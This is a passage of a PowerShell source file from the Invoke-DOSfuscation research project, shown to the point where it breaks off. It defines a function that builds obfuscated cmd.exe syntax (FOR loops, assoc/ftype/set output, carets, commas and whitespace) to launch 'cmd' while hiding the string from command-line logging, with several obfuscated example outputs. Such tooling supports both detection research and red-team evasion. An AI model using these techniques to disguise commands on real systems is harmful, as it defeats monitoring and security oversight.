#   This file is part of Invoke-DOSfuscation.
#
#   Copyright 2018 Daniel Bohannon <@danielhbohannon>
#         while at Mandiant <http://www.mandiant.com>
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.



function Get-ObfuscatedCmd
{
<#
.SYNOPSIS

Get-ObfuscatedCmd returns properly escaped intricate syntax that resolves to "cmd" in memory but not on the command line (except for "env" option). It relies on numerous methods supported by cmd.exe including:
    1) substring capabilities in the context of environment variables
    2) SET, ASSOC and FTYPE native commands for producing output containing "cmd"
    3) FIND and FINDSTR for selecting line in output containing "cmd"
    4) FOR loop for setting native command output as an environment variable
    5) FOR loop delims and tokens arguments for extracting "cmd" from output
    6) optional randomized casing
    7) optional whitespace obfuscation
    8) optional caret (and double-caret) obfuscation

Invoke-DOSfuscation Function: Get-ObfuscatedCmd
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-RandomCase, Out-ObfuscatedCaret, Get-RandomWhitespaceAndRandomChar, Out-EnvVarEncodedCommand (all located in Invoke-DOSfuscation.psm1)
Optional Dependencies: None
 
.DESCRIPTION

Get-ObfuscatedCmd returns properly escaped intricate syntax that resolves to "cmd" in memory but not on the command line (except for "env" option)

.PARAMETER ObfuscationLevel

(Optional) Specifies the preset obfuscation "profile" of all below parameters. This is to simplify general usage of this function without becoming overwhelmed by all of the options.

.PARAMETER ObfuscationType

(Optional) Specifies the obfuscation type to produce "cmd":
1) env (environment variable substring encoding)
2) assoc (FOR loop + assoc w/optional FIND/FINDSTR)
3) ftype (FOR loop + ftype w/optional FIND/FINDSTR)
4) set (FOR loop + set w/optional FIND/FINDSTR)

.PARAMETER VarName

(Optional) Specifies the single alphanumeric character for the FOR loop variable name (not used in the "env" option).

.PARAMETER RandomCase

(Optional) Specifies that random casing be used wherever possible.

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input wherever possible.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas and semicolons be input wherever possible in the command.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas and semicolons to be input wherever possible in the command if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the character or array of characters (only comma and semicolon) to use if -RandomChar is also selected.

.PARAMETER RandomCaret

(Optional) Specifies that random carets be added before non-escapable characters in syntax components not affected by caret escape characters.

.PARAMETER RandomCaretPercent

(Optional) Specifies the percentage of characters to obfuscate with caret escape characters if -RandomCaret is also selected.

.PARAMETER DoubleEscape

(Optional) Specifies that double caret escaping occur for eligible components of the FOR loop sub-command so one layer of caret escapes will persist into the execution of the child process(es) of the sub-command.

.EXAMPLE

C:\PS> Get-ObfuscatedCmd

FOR /F "delims=lc tokens=5" %p IN ('assoc^|findstr lCmd')DO %p

.EXAMPLE

C:\PS> Get-ObfuscatedCmd -ObfuscationLevel 3

^F^o^r   ,    ,   ;   ,  /^F   ;  ;  ,    ;    ;    ;  ,  "       tokens=    2       delims=j1AfJ="   ;  ;    ,    ;   %j  ,   ;   ;  ;  ^iN  ;  ,   ;    ,   ;  ,    (   ;   ;   ,    ;  ;  ,    '  ,  ;  ;  ^^A^^S^^So^^C   ;   ;   ,  ,   ;  ,   ;  ^^.^^c^^m^^d   '   ,   ,   ;    ,    ,  ;  )   ,  ,  ;   ,  ,  ;  ;   ^D^O   ;    ;  ,    ,  ,    ,  ;   %j

.EXAMPLE

C:\PS> Get-ObfuscatedCmd -ObfuscationType env -RandomCase -RandomSpace -RandomSpaceRange @(2..5) -RandomCaret -RandomCaretPercent 25

C%progRAMW6432:~    9,   -6%^D

.EXAMPLE

C:\PS> Get-ObfuscatedCmd -ObfuscationType assoc -RandomCase -RandomSpace -RandomSpaceRange @(2..5) -RandomChar -RandomCharRange @(2..5) -RandomCaret -RandomCaretPercent 75 -DoubleEscape

^f^o^r  , ,  /^F  , , , , "    delims=lb  tokens=     3  "  ,  ,  ,   ,  ,  %F  ,   ,  ^in  ,   ,   ,  ,  , (  ,  ,  ,  ,  , ' ,   , , , ^^A^^s^^s^^O^^C ,   ,  ,   ,  ,   ^^.^^c^^d^^x^^m^^l     '  ,  ,  )  ,  ,  ,   ,  ,  ^D^O  ,   ,  ,  ,   %F

.EXAMPLE

C:\PS> Get-ObfuscatedCmd -ObfuscationType ftype -RandomCase -RandomSpace -RandomSpaceRange @(2..5) -RandomChar -RandomCharRange @(2..5) -RandomCaret -RandomCaretPercent 75 -DoubleEscape

F^o^r  ;  ;   ;  /^F  ;  ;   ;   ;  ;   "    delims=unfR     tokens=    1   " ;   ; ; %b ;  ;  ;  ; IN   ;  ;  ;  ;   ;   ( ;  ;   ;  ' ; ;  ;  ;  ; ^^Ft^^y^^P^^e   ;  ;  ;   ^| ;  ; ;  ;  ^^F^^IN^^d   ;   ;  ; ;   "cm" ; ; ;  ;  '  ;   ;   )  ;   ;  ;  ;   ^D^O ; ;  ; %b

.EXAMPLE

C:\PS> Get-ObfuscatedCmd -ObfuscationType set -RandomCase -RandomSpace -RandomSpaceRange @(2..5) -RandomChar -RandomCharRange @(2..5) -RandomCaret -RandomCaretPercent 75 -DoubleEscape

f^o^r  , ,  ,  ,   ,   /^F   ,  ,  ,  "  tokens=   4   delims=.\Rb"  , ,   ,  ,  ,   %y  ,  , ,   , ,  ^In   ,  ,   ,   (  ,  ,   '  ,   ,  , , , ^^s^^eT  ,  , ,  ,  ,  ComSp   '   ,  ,  )  ,  ,  ^d^O   ,   ,   %y

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>
        
    [CmdletBinding()]
    [OutputType('System.String')]
    param (
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet(1,2,3)]
        [System.Int16]
        $ObfuscationLevel,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet('env','assoc','ftype','set')]
        [System.String]
        $ObfuscationType = (Get-Random -InputObject @('assoc','ftype')),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9')]
        [System.Char]
        $VarName = (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122)))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCase,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomCharRange = @(1..5),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | where-object { @(',',';','(',')') -contains $_ }) -or ($_ | where-object { ($_.Count -eq 2) -and (@(',',';') -contains $_[0]) -and (@(',',';') -contains $_[1]) }) } )]
        [System.Object[]]
        $RandomCharArray = (Get-Random -InputObject @(@(','),@(';'),@(',',';'))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCaret,
           
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCaretPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $DoubleEscape
    )

    # Create "profiles" depending on -ObfuscationLevel value. This is to simplify general usage of this function without becoming overwhelmed by all of the options.
    if ($ObfuscationLevel)
    {
        switch ($ObfuscationLevel)
        {
            '1' {
                $ObfuscationType = 'env'
                $RandomCase      = $false
                $RandomSpace     = $false
                $RandomChar      = $false
                $RandomCaret     = $false
                $DoubleEscape    = $false
            }
            '2' {
                $ObfuscationType = Get-Random -InputObject @('assoc','ftype')
                $RandomCase      = $false
                $RandomSpace     = $false
                $RandomChar      = $false
                $RandomCaret     = $false
                $DoubleEscape    = $false
            }
            '3' {
                $ObfuscationType    = Get-Random -InputObject @('assoc','ftype')
                $RandomCase         = $true
                $RandomSpace        = $true
                $RandomSpaceRange   = @(3..7)
                $RandomChar         = $true
                $RandomCharRange    = @(3..7)
                $RandomCharArray    = @(',',';')
                $RandomCaret        = $true
                $RandomCaretPercent = Get-Random -InputObject @(65..85)
                $DoubleEscape       = $true
            }
        }
    }

    # Set random case values if -RandomCase switch is set.
    $for     = 'FOR'
    $f       = 'F'
    $tokens  = 'tokens'
    $delims  = 'delims'
    $in      = 'IN'
    $do      = 'DO'
    $find    = 'find'
    $findstr = 'findstr'
    $assoc   = 'assoc'
    $ftype   = 'ftype'
    $set     = 'set'
    if ($RandomCase.IsPresent)
    {
        $for     = Out-RandomCase $for
        $f       = Out-RandomCase $f
        $tokens  = Out-RandomCase $tokens
        $delims  = Out-RandomCase $delims
        $in      = Out-RandomCase $in
        $do      = Out-RandomCase $do
        $find    = Out-RandomCase $find
        $findstr = Out-RandomCase $findstr
        $assoc   = Out-RandomCase $assoc
        $ftype   = Out-RandomCase $ftype
        $set     = Out-RandomCase $set
    }

    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $for = Out-ObfuscatedCaret -StringToObfuscate $for -RandomCaretPercent:$RandomCaretPercent
        $f   = Out-ObfuscatedCaret -StringToObfuscate $f   -RandomCaretPercent:$RandomCaretPercent
        $in  = Out-ObfuscatedCaret -StringToObfuscate $in  -RandomCaretPercent:$RandomCaretPercent
        $do  = Out-ObfuscatedCaret -StringToObfuscate $do  -RandomCaretPercent:$RandomCaretPercent
    }
    
    # Add random carets if -RandomCaret or -DoubleEscape switch is set.
    if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
    {
        $find    = Out-ObfuscatedCaret -StringToObfuscate $find    -RandomCaretPercent:$RandomCaretPercent
        $findstr = Out-ObfuscatedCaret -StringToObfuscate $findstr -RandomCaretPercent:$RandomCaretPercent
        $assoc   = Out-ObfuscatedCaret -StringToObfuscate $assoc   -RandomCaretPercent:$RandomCaretPercent
        $ftype   = Out-ObfuscatedCaret -StringToObfuscate $ftype   -RandomCaretPercent:$RandomCaretPercent
        $set     = Out-ObfuscatedCaret -StringToObfuscate $set     -RandomCaretPercent:$RandomCaretPercent
    }
    
    # Double escape caret characters in sub-command components if -DoubleEscape switch is set.
    if ($DoubleEscape.IsPresent)
    {
        $find    =    $find.Replace('^','^^')
        $findstr = $findstr.Replace('^','^^')
        $assoc   =   $assoc.Replace('^','^^')
        $ftype   =   $ftype.Replace('^','^^')
        $set     =     $set.Replace('^','^^')
    }

    # Set random whitespace values if -RandomSpace switch is set.
    $randomSpaceA = ''
    $randomSpace1 = ''
    $randomSpace2 = ''
    $randomSpace3 = ''
    $randomSpace4 = ''
    if ($RandomSpace.IsPresent)
    {
        $randomSpaceA = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace1 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace2 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace3 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace4 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }

    # Get random commas and/or semicolons (and whitespace mixed in if -RandomSpace is also selected).'
    $randomCharA = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharB = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharC = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharD = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharE = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar1 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar2 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar3 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar4 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar5 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar6 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar7 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar8 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar9 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    
    # Ensure specific $randomChar* variables are at least one whitespace if they are not defined.
    if (-not $randomSpace2) { $randomSpace2 = ' ' }
    if (-not $randomCharD)  { $randomCharD  = ' ' }
    if (-not $randomChar1)  { $randomChar1  = ' ' }
    if (-not $randomChar2)  { $randomChar2  = ' ' }
    if (-not $randomChar3)  { $randomChar3  = ' ' }
    if (-not $randomChar4)  { $randomChar4  = ' ' }
    if (-not $randomChar5)  { $randomChar5  = ' ' }
    if (-not $randomChar9)  { $randomChar9  = ' ' }

    # Randomly select between FINDSTR and FIND (adding double quotes around $subFindVal later via $quotes variable if FIND is selected).
    if (Get-Random -InputObject @(0..1))
    {
        $subFind = $findstr
        $quotes = ''
    }
    else
    {
        $subFind = $find
        $quotes = '"'
    }

    # Set core components of intricate syntax per -ObfuscationType option.
    $tokenValues = @()
    $delimValues = @()
    switch ($ObfuscationType)
    {
        'env' {
            # Calculate percentage of characters to substitute with environment variable substring syntax.
            $envVarPercent = $RandomCaretPercent
            
            # Retrieve environment variable encoded version of $stringToEncode below calling Out-EnvVarEncodedCommand up to $tryLimit times to increases the likelihood that some encoding actually takes place, particularly for low -EnvVarPercent values.
            $stringToEncode = 'cmd'
            $tryLimit = 5
            $tryCount = 0
            do
            {
                $finalResult = Out-EnvVarEncodedCommand -StringToEncode $stringToEncode -EnvVarPercent $envVarPercent -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent -DoubleEscape:$DoubleEscape
                $tryCount++
            }
            while (($finalResult -eq $stringToEncode) -and ($tryCount -lt $tryLimit))
            
            # Since there is no FOR LOOP syntax required for the env option of this function we will return the result from this switch statement instead of proceeding like the rest of the options necessitate.
            return $finalResult
        }
        'assoc' {
            # Randomly choose between assoc+file extension and assoc+find/findstr syntaxes.
            if (Get-Random -InputObject @(0..1))
            {
                # Set value pairings for retrieving "cmd" with assoc command.
                $valuePairings  = @()
                $valuePairings += @{ Extension = '.cmd';   RequiredDelims = @('=','f'); SearchTerm = 'cmd'; Output = '.cmd=cmdfile' }
                # .cdxml value is not present in assoc command on Win7 so commenting out.
                # $valuePairings += @{ Extension = '.cdxml'; RequiredDelims = @('l');     SearchTerm = 'Cmd'; Output = '.cdxml=Microsoft.PowerShellCmdletDefinitionXML.1' }

                # Select random pairing values from above.
                $valuePairing = Get-Random -InputObject $valuePairings

                # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
                $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
                $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

                # Randomize order of $delimValues.
                $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

                # Since the search term (file extension) used by assoc imposes its case on the output result we will perform this case-insensitive substitution since it will affect the tokens index value(s).
                $valuePairing.Output = $valuePairing.Output -ireplace [Regex]::Escape($valuePairing.Extension),$valuePairing.Extension

                # Retrieve all matching tokens index values from assoc output, required+randomly-selected delim values and search term.
                $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

                # Add random carets if -RandomCaret or -DoubleEscape switch is set.
                if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
                {
                    # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                    if ($subFind.Replace('^','') -ieq 'findstr')
                    {
                        # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                        if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.Extension.Contains('^='))
                        {
                            $valuePairing.Extension = $valuePairing.Extension.Replace('=','^=')
                        }
        
                        $valuePairing.Extension = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.Extension -RandomCaretPercent:$RandomCaretPercent
                    }
                }

                # Double escape caret characters in $valuePairing.Extension if -DoubleEscape switch is set.
                if ($DoubleEscape.IsPresent)
                {
                    $valuePairing.Extension = $valuePairing.Extension.Replace('^','^^').Replace('^^=','^^^=')
                }

                # Assemble the sub-command that will produce output in cmd.exe that contains "cmd".
                $subCommand = "$randomCharA$assoc$randomCharB$($valuePairing.Extension)$randomSpace4"
            }
            else
            {
                # Randomly select from find/findstr query values that return specific output containing "cmd".
                $findValCmd   = Get-Random -InputObject @('md=','md=c','d=c','d=cm','=cm','mdf','mdfi')
                $findValCdxml = Get-Random -InputObject @('cdxm','cdxml','llCm','lCm','lCmd','Cmdl','onX','nX','nXM','onXM')

                # cmdfile has "cmd" (case-sensitive) twice in its result, so randomly select required delimiter values for each instance.
                $cmdfileRequiredDelims = Get-Random -InputObject @(@('.','='),@('=','f'))
                
                # Set value pairings for retrieving "cmd" with assoc+find/findstr command.
                $valuePairings  = @()
                $valuePairings += @{ FindVal = $findValCmd;   RequiredDelims = $cmdfileRequiredDelims; SearchTerm = 'cmd'; Output = '.cmd=cmdfile' }
                $valuePairings += @{ FindVal = $findValCdxml; RequiredDelims = @('l');                 SearchTerm = 'Cmd'; Output = '.cdxml=Microsoft.PowerShellCmdletDefinitionXML.1' }

                # Select random pairing values from above.
                $valuePairing = Get-Random -InputObject $valuePairings

                # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
                $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
                $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

                # Randomize order of $delimValues.
                $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

                # Retrieve all matching tokens index values from assoc output, required+randomly-selected delim values and search term.
                $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

                # If FIND is being used versus FINDSTR then add random characters at the end instead of whitespace.
                if ($subFind.Replace('^','') -ieq 'find')
                {
                    $randomSpace4 = $randomCharE
                }
                else
                {
                    # Equal characters in the FINDSTR argument need to be escaped with a caret.
                    if ($valuePairing.FindVal.Contains('='))
                    {
                        $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                    }
                }

                # Add random carets if -RandomCaret or -DoubleEscape switch is set.
                if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
                {
                    # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                    if ($subFind.Replace('^','') -ieq 'findstr')
                    {
                        # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                        if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.FindVal.Contains('^='))
                        {
                            $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                        }

                        $valuePairing.FindVal = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.FindVal -RandomCaretPercent:$RandomCaretPercent
                    }
                }

                # Double escape caret characters in $valuePairing.FindVal if -DoubleEscape switch is set.
                if ($DoubleEscape.IsPresent)
                {
                    $valuePairing.FindVal = $valuePairing.FindVal.Replace('^','^^').Replace('^^=','^^^=')
                }

                # Assemble the sub-command that will produce output in cmd.exe that contains "cmd".
                $subCommand = "$randomCharA$assoc$randomCharB^|$randomCharC$subFind$randomCharD$quotes$($valuePairing.FindVal)$quotes$randomSpace4"
            }
        }
        'ftype' {
            # Randomly select from find/findstr query values that return specific output containing "cmd".
            $findValCmdfile   = Get-Random -InputObject @('cm','mdf','mdfi','dfi','dfil')
            $findValSHCmdFile = Get-Random -InputObject @('SHC','SHCm','HC','HCm','Cm','mdF','mdFi')

            # Set value pairings for retrieving "cmd" with ftype+find/findstr command.
            $valuePairings  = @()
            $valuePairings += @{ FindVal = $findValCmdfile;   RequiredDelims = @('f');     SearchTerm = 'cmd'; Output = 'cmdfile="%1" %*' }
            $valuePairings += @{ FindVal = $findValSHCmdFile; RequiredDelims = @('H','F'); SearchTerm = 'Cmd'; Output = 'SHCmdFile=%SystemRoot%\explorer.exe' }
            
            # Select random pairing values from above.
            $valuePairing = Get-Random -InputObject $valuePairings

            # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
            $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
            $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

            # Randomize order of $delimValues.
            $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

            # Retrieve all matching tokens index values from ftype output, required+randomly-selected delim values and search term.
            $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

            # If FIND is being used versus FINDSTR then add random characters at the end instead of whitespace.
            if ($subFind.Replace('^','') -ieq 'find')
            {
                $randomSpace4 = $randomCharE
            }
            else
            {
                # Equal characters in the FINDSTR argument need to be escaped with a caret.
                if ($valuePairing.FindVal.Contains('='))
                {
                    $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                }
            }

            # Add random carets if -RandomCaret or -DoubleEscape switch is set.
            if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
            {
                # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                if ($subFind.Replace('^','') -ieq 'findstr')
                {
                    # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                    if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.FindVal.Contains('^='))
                    {
                        $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                    }

                    $valuePairing.FindVal = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.FindVal -RandomCaretPercent:$RandomCaretPercent
                }
            }

            # Double escape caret characters in $valuePairing.FindVal if -DoubleEscape switch is set.
            if ($DoubleEscape.IsPresent)
            {
                $valuePairing.FindVal = $valuePairing.FindVal.Replace('^','^^').Replace('^^=','^^^=')
            }

            # Assemble the sub-command that will produce output in cmd.exe that contains "cmd".
            $subCommand = "$randomCharA$ftype$randomCharB^|$randomCharC$subFind$randomCharD$quotes$($valuePairing.FindVal)$quotes$randomSpace4"
        }
        'set' {
            Write-Warning "Using SET intricate syntax for Cmd will produce an incorrect result if launched from PowerShell or PowerShell_ISE since these binaries append an additional path to `$env:PSModule not found when running from other binaries (like cmd.exe)."

            # Randomly choose between set+environment variable name and set+find/findstr syntaxes.
            if (Get-Random -InputObject @(0..1))
            {
                # Randomly select from environment variable values that return specific output containing "cmd".
                $setValComSpec = Get-Random -InputObject @('ComS','ComSp','ComSpe')
                
                # Set value pairings for retrieving "cmd" with set command.
                $valuePairings  = @()
                $valuePairings += @{ EnvVarSubstring = $setValComSpec; RequiredDelims = @('\','.'); SearchTerm = 'cmd'; Output = 'ComSpec=C:\Windows\system32\cmd.exe' }
                
                # Select random pairing values from above.
                $valuePairing = Get-Random -InputObject $valuePairings

                # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
                $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
                $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

                # Randomize order of $delimValues.
                $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

                # Retrieve all matching tokens index values from set output, required+randomly-selected delim values and search term.
                $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

                # Add random carets if -RandomCaret or -DoubleEscape switch is set.
                if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
                {
                    # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                    if ($subFind.Replace('^','') -ieq 'findstr')
                    {
                        # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                        if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.EnvVarSubstring.Contains('^='))
                        {
                            $valuePairing.EnvVarSubstring = $valuePairing.EnvVarSubstring.Replace('=','^=')
                        }

                        $valuePairing.EnvVarSubstring = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.EnvVarSubstring -RandomCaretPercent:$RandomCaretPercent
                    }
                }

                # Double escape caret characters in $valuePairing.EnvVarSubstring if -DoubleEscape switch is set.
                if ($DoubleEscape.IsPresent)
                {
                    $valuePairing.EnvVarSubstring = $valuePairing.EnvVarSubstring.Replace('^','^^').Replace('^^=','^^^=')
                }

                # Assemble the sub-command that will produce output in cmd.exe that contains "cmd".
                $subCommand = "$randomCharA$set$randomCharD$($valuePairing.EnvVarSubstring)$randomSpace4"
            }
            else
            {
                # Randomly select from find/findstr query values that return specific output containing "cmd".
                $findValComspec = Get-Random -InputObject @('ComS','omS','mS','mSp','Sp','Spe','pec','md.e')
                
                # Set value pairings for retrieving "cmd" with set+find/findstr command.
                $valuePairings  = @()
                $valuePairings += @{ FindVal = $findValComspec; RequiredDelims = @('\','.'); SearchTerm = 'cmd'; Output = 'ComSpec=C:\Windows\system32\cmd.exe' }
            
                # Select random pairing values from above.
                $valuePairing = Get-Random -InputObject $valuePairings

                # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
                $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
                $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

                # Randomize order of $delimValues.
                $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

                # Retrieve all matching tokens index values from set output, required+randomly-selected delim values and search term.
                $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

                # If FIND is being used versus FINDSTR then add random characters at the end instead of whitespace.
                if ($subFind.Replace('^','') -ieq 'find')
                {
